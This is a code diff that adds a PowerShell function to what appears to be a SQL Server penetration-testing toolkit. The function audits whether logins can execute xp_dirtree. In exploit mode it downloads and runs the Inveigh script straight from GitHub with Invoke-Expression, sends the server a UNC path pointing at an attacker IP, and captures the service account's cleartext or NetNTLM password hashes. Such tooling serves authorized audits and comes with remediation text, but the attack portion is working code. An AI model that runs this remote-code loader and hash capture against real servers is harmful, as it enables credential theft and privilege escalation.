@@ -9271,6 +9271,296 @@ Function Invoke-SQLAuditPrivTrustworthy{
 
 
 # ---------------------------------------
+# Invoke-SQLAuditPrivXpDirtree
+# ---------------------------------------
+# Author: Scott Sutherland
+Function Invoke-SQLAuditPrivXpDirtree{
+<#
+    .SYNOPSIS
+        Check if the current user has privileges to execute xp_dirtree extended stored procedure.  
+        If exploit option is used, the script will inject a UNC path to the attacker's IP and capture 
+        the SQL Server service account password hash using Inveigh.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to.
+    .PARAMETER Exploit
+        Exploit vulnerable issues.  
+    .PARAMETER AttackerIp
+        IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.                
+    .EXAMPLE
+        PS C:\> Invoke-SQLAuditPrivXpDirtree -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2 
+
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpDirtree -Verbose 
+#>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server or domain account to authenticate with.")]
+        [string]$Username,
+
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server or domain account password to authenticate with.")]
+        [string]$Password,
+
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="Windows credentials.")]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+        
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server instance to connection to.")]
+        [string]$Instance,       
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Don't output anything.")]
+        [string]$NoOutput,
+        
+        [Parameter(Mandatory=$false,
+        HelpMessage="Exploit vulnerable issues.")]
+        [switch]$Exploit,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.")]
+        [string]$AttackerIp,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Time in second to way for hash to be captured.")]
+        [int]$Timeout = 5
+    )
+
+    Begin
+    {                 
+        # Table for output
+        $TblData = New-Object System.Data.DataTable 
+        $TblData.Columns.Add("ComputerName") | Out-Null
+        $TblData.Columns.Add("Instance") | Out-Null
+        $TblData.Columns.Add("Vulnerability") | Out-Null
+        $TblData.Columns.Add("Description") | Out-Null
+        $TblData.Columns.Add("Remediation") | Out-Null
+        $TblData.Columns.Add("Severity") | Out-Null
+        $TblData.Columns.Add("IsVulnerable") | Out-Null
+        $TblData.Columns.Add("IsExploitable") | Out-Null
+        $TblData.Columns.Add("Exploited") | Out-Null
+        $TblData.Columns.Add("ExploitCmd") | Out-Null
+        $TblData.Columns.Add("Details") | Out-Null    
+        $TblData.Columns.Add("Reference") | Out-Null   
+        $TblData.Columns.Add("Author") | Out-Null   
+    }
+
+    Process
+    {   
+        # Status User
+        Write-Verbose "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree" 
+
+        # Test connection to server
+        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
+        if(-not $TestConnection){   
+            
+            # Status user
+            Write-Verbose "$Instance : CONNECTION FAILED."
+            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."           
+            Return
+        }else{
+            Write-Verbose "$Instance : CONNECTION SUCCESS."
+        }
+
+        # Grab server information
+        # Grab server, login, and role information
+        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
+        $ComputerName = $ServerInfo.ComputerName                
+        $CurrentLogin = $ServerInfo.CurrentLogin        
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose              
+        $CurrentPrincpalList = @()
+        $CurrentPrincpalList += $CurrentLogin       
+        $CurrentPrincpalList += 'Public'
+        $CurrentLoginRoles | ForEach-Object{ $CurrentPrincpalList += $_.RolePrincipalName }   
+
+        # --------------------------------------------     
+        # Set function meta data for report output
+        # --------------------------------------------  
+        if($Exploit){
+            $TestMode  = "Exploit"
+        }else{
+            $TestMode  = "Audit"
+        }         
+        $Vulnerability = "Excessive Privilege - Execute xp_dirtree"
+        $Description   = "Xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isn’t being used.  That’s because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default."
+        $Remediation   = "Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public"
+        $Severity      = "Medium" 
+        $IsVulnerable  = "No"
+        $IsExploitable = "No" 
+        $Exploited     = "No"
+        $ExploitCmd    = "Invoke-SQLAuditPrivXpDirtree -Verbose -Exploit -AttackerIp YOURIP"
+        $Details       = ""   
+        $Reference     = "https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/"       
+        $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016" 
+        
+        # -----------------------------------------------------------------     
+        # Check for the Vulnerability
+        # Note: Typically a missing patch or weak configuration
+        # -----------------------------------------------------------------     
+
+        # Get users and roles that execute xp_dirtree
+        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object {$_.ObjectName -eq 'xp_dirtree' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'}
+
+        # Update vulnerable status
+        if($DirTreePrivs){
+
+            # Status user
+            Write-Verbose "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE."  
+
+            $IsVulnerable  = "Yes"             
+            $DirTreePrivs | 
+            ForEach-Object{                
+                $PrincipalName = $DirTreePrivs.PrincipalName                
+        
+                # Check if current login can exploit
+                $CurrentPrincpalList |
+                ForEach-Object{ 
+                    $PrincipalCheck = $_
+
+                    if($PrincipalName -eq $PrincipalCheck){
+                        $IsExploitable  = "Yes" 
+
+                        # Check for exploit flag
+                        if($Exploit){
+                            
+                            # Attempt to load Inveigh from file
+                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue | Out-Null
+                            #Invoke-Expression($InveighSrc)
+
+                            # Attempt to load Inveigh via reflection
+                            Invoke-Expression(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1");
+
+                            $TestIt = Test-Path Function:\Invoke-Inveigh
+                            if($TestIt -eq "True"){
+                                Write-Verbose "$Instance : - Inveigh loaded." 
+
+                                # Get IP of SQL Server instance
+                                $InstanceIP = Resolve-DnsName $ComputerName | select IPaddress -ExpandProperty ipaddress 
+                                
+                                # Start sniffing for hashes from that IP
+                                Write-Verbose "$Instance : - Start sniffing..." 
+                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
+
+                                # Get IP of current system
+                                if(-not $AttackerIp){
+
+                                    # Send query for each local ipv4 IP
+                                    Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPV4" -and $_.IPAddress -ne "127.0.0.1"} | 
+                                    ForEach-Object{
+
+                                        $TargetIP = $_.IPAddress
+
+                                        # Sent unc path to attackers
+                                        Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$TargetIP\path'" -TimeOut 1 -SuppressVerbose
+                                    }
+                                }else{
+
+                                    # Sent unc path to attacker's Ip
+                                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 1 -SuppressVerbose
+                                } 
+                                
+                                # Stop sniffing and print password hashes
+                                sleep $Timeout
+                                Stop-Inveigh | Out-Null 
+                                Write-Verbose "$Instance : - Stopped sniffing..." 
+                                
+                                $HashType =  ""
+                                $Hash = ""
+
+                                [string]$PassCleartext = Get-InveighCleartext 
+                                if($PassCleartext){
+                                    $HashType = "Cleartext"
+                                    $Hash = $PassCleartext
+                                }
+
+                                [string]$PassNetNTLMv1 = Get-InveighNTLMv1
+                                if($PassNetNTLMv1){
+                                    $HashType = "NetNTLMv1"
+                                    $Hash = $PassNetNTLMv1
+                                }
+
+                                [string]$PassNetNTLMv2 = Get-InveighNTLMv2
+                                if($PassNetNTLMv2){
+                                    $HashType = "NetNTLMv2"
+                                    $Hash = $PassNetNTLMv2
+                                }                                                                       
+                                
+                                if($Hash){
+
+                                     # Update Status    
+                                    $Exploited = "Yes"
+                                    $Details = "$Instance : - The $PrincipalName has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash" 
+                                }else{
+
+                                    # Update Status    
+                                    $Exploited = "No"
+                                    $Details = "$Instance : - The $PrincipalName has EXECUTE privileges on XP_DIRTREE procedure in the master database.  Exploited, but no password hash was recovered."   
+                                }        
+                                
+                                # Clear inveigh cache
+                                Clear-Inveigh | Out-Null                                          
+                            }else{
+                                Write-Verbose "$Instance : - Inveigh could not be loaded." 
+                                # Update status
+                                $Exploited = "No"
+                                $Details = "$Instance : - The $PrincipalName has EXECUTE privileges on XP_DIRTREE procedure in the master database." 
+                            }
+                        }else{
+                            
+                            # Update status
+                            $Exploited = "No"
+                            $Details = "$Instance : - The $PrincipalName has EXECUTE privileges on XP_DIRTREE procedure in the master database."                            
+                        }
+                    }else{
+
+                        # Update status
+                        $IsExploitable  = "No" 
+                        $Details = "$Instance : - The $PrincipalName has EXECUTE privileges on XP_DIRTREE procedure in the master database."  
+                    }
+                }
+
+                # Add record                              
+                $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                                       
+            }
+
+            # -----------------------------------------------------------------     
+            # Check for exploit dependancies 
+            # Note: Typically secondary configs required for dba/os execution
+            # -----------------------------------------------------------------            
+            # $IsExploitable = "No" or $IsExploitable = "Yes
+
+
+        }else{
+            Write-Verbose "$Instance : - No logins were found with the EXECUTE privilege on xp_dirtree."
+        }                       
+                   
+        # Status User
+        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE" 
+    }
+
+    End
+    {   
+        # Return data  
+        if ( -not $NoOutput){            
+            Return $TblData       
+        }
+    }
+}
+
+
+# ---------------------------------------
 # Invoke-SQLAuditPrivDbChaining
 # ---------------------------------------
 # Author: Scott Sutherland
